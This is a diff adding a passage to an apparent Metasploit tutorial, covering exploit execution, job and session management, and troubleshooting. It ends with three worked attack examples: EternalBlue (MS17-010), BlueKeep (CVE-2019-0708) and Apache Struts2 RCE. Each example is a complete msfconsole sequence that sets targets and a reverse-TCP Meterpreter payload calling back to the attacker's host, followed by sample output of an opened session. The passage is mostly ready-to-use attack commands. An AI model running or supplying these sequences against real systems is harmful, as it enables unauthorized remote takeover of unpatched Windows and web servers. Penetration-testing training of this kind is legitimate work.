@@ -422,3 +422,130 @@ set SESSION 1
 run
 ```
 
+## Running the Exploit:
+
+|Command| Purpose|
+|---|---|
+|run| Execute the exploit once|
+|exploit| Same as run|
+|run -j| Run as background job (keeps console free)|
+|run -v| Verbose output (shows everything)|
+|run -d |Run without checking for conflicts|
+
+## Job Management (Background Exploits)
+
+- When you use run -j, the exploit runs in the background.
+
+|Command| Purpose|
+|---|---|
+|jobs| List all running jobs|
+|jobs -k [ID] |Kill a specific job|
+|jobs -K |Kill all running jobs|
+
+## Check vs. Run
+
+|Command |Purpose| Risk|
+|---|---|---|
+|check| Tests if target is vulnerable without exploiting| Low risk, no crash|
+|run| Actually exploits the target| May crash target|
+
+- Always run check first if the module supports it (Check column says "Yes").
+
+## After Successful Exploitation
+
+-  When an exploit succeeds, you'll see something like:
+
+```bash
+[*] Started reverse TCP handler on 192.168.1.5:4444
+[*] Sending stage (200774 bytes) to 192.168.1.10
+[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.10:49178)
+```
+### Session management commands:
+
+|Command |Purpose|
+|---|----|
+|sessions| List all active sessions|
+|sessions -i [ID] |Interact with a specific session|
+|sessions -k [ID] |Kill a specific session|
+|sessions -K| Kill all sessions|
+|sessions -c [cmd]| Run command on all sessions|
+|background| Send current session to background|
+
+
+## If the Exploit Fails: Troubleshooting
+
+|Symptom| Likely Cause |Solution|
+|----|----|----|
+|Exploit completed, but no session| |Payload didn't connect| Check LHOST, LPORT, firewall rules|
+|"Connection refused" |Port is closed or filtered| Try different RPORT|
+|"Target is not vulnerable" |Patch has been applied| Find a different exploit|
+|"Exploit crashed the target" |Target unstable| Choose a different exploit or target type|
+|"Timeout"| Network issues or slow target| Increase timeout: set WfsDelay 10|
+|"Failed to load module"| Module path wrong| Double-check the path with search|
+
+
+## Real-World Exploit Example 1: EternalBlue (MS17-010)
+
+- This exploit targets Windows SMB vulnerability from 2017. Still works on unpatched systems.
+
+```bash
+msfconsole -q
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set LHOST 192.168.1.5
+set LPORT 4444
+set payload windows/x64/meterpreter/reverse_tcp
+check
+run
+sessions -i 1
+```
+
+
+## Real-World Exploit Example 2: BlueKeep (RDP)
+
+- This exploits a vulnerability in Remote Desktop Protocol (CVE-2019-0708).
+
+```bash
+use exploit/windows/rdp/cve_2019_0708_bluekeep
+set RHOSTS 192.168.1.10
+set LHOST 192.168.1.5
+set LPORT 4444
+show targets
+set target 7
+run
+```
+- Important: BlueKeep requires the correct target number. Use show targets and match the target to the victim's operating system. Wrong target will crash the target.
+
+
+  ## Real-World Exploit Example 3: Apache Struts2
+
+- This exploits a remote code execution vulnerability in Apache Struts2 web applications.
+
+```bash
+use exploit/multi/http/struts2_rest_xstream
+set RHOSTS 192.168.1.10
+set RPORT 8080
+set TARGETURI /orders
+set LHOST 192.168.1.5
+set LPORT 4444
+run
+```
+
+
+## Summary: The Exploit Workflow
+
+|Step |Code|
+|----|----|
+|1. Search for exploit  |  → search [keyword]|
+|2. Select exploit   |     → use [module/path]|
+|3. Show options     |     → show options|
+|4. Set parameters    |    → set RHOSTS, set LHOST, etc.|
+|5. Show targets     |     → show targets (if needed)|
+|6. Show payloads    |     → show payloads|
+|7. Set payload       |    → set payload [path]|
+|8. Test vulnerability |   → check|
+|9. Run exploit     |      → run|
+|10. Interact with session| → sessions -i [ID]|
+
+
